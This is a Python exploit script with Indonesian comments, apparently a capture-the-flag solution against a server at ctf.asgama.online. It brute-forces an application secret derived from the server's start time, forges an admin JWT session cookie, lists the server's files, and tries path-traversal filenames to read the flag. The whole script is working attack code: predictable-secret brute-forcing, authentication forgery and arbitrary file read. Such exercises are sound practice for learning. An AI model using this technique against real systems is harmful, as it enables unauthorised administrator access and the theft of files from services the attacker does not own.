import time
import hashlib
import jwt
import requests

# === Konfigurasi ===
TARGET_URL = "http://ctf.asgama.online:40004/"
UPTIME_NOW = 217427  # Uptime terbaru dari server
RANGE = 300  # Brute-force range (±detik)
FLAG_CANDIDATES = ["flag.txt", "/in_prod_this_is_random", "/in_prod_this_is_random/flag.txt"]

now = round(time.time())

print("[*] Memulai brute-force APP_SECRET dan JWT...")

for delta in range(-RANGE, RANGE + 1):
    time_started = now - UPTIME_NOW + delta
    app_secret = hashlib.sha256(str(time_started).encode()).hexdigest()
    payload = {"userid": 0}
    token = jwt.encode(payload, app_secret, algorithm='HS256')
    cookies = {"session": token}

    try:
        files_resp = requests.get(f"{TARGET_URL}/api/files", cookies=cookies, timeout=3)
        if files_resp.status_code == 200:
            print(f"[+] Berhasil login sebagai admin!")
            print(f"    time_started = {time_started}")
            print(f"    APP_SECRET   = {app_secret}")
            print(f"    Token        = {token}")

            # === Cek isi files/ ===
            filenames = files_resp.json()
            print("[+] File ditemukan di folder 'files/':")
            for fname in filenames:
                print(f"  - {fname}")
                if "flag" in fname.lower():
                    print(f"[+] Mencoba membaca isi file: {fname}")
                    flag_resp = requests.get(f"{TARGET_URL}/api/file", params={"filename": fname}, cookies=cookies)
                    print("[+] Flag ditemukan (kemungkinan):")
                    print(flag_resp.text)
                    exit()

            # === Coba traversal jika tidak ada file mencurigakan ===
            print("[*] Tidak ada file mencurigakan di folder. Mencoba traversal bypass...")
            for path in FLAG_CANDIDATES:
                print(f"[?] Mencoba: {path}")
                flag_resp = requests.get(f"{TARGET_URL}/api/file", params={"filename": path}, cookies=cookies)
                if flag_resp.status_code == 200:
                    print("[✅] Flag ditemukan:")
                    print(flag_resp.text)
                    exit()
                else:
                    print(f"[-] Gagal ({flag_resp.status_code})")

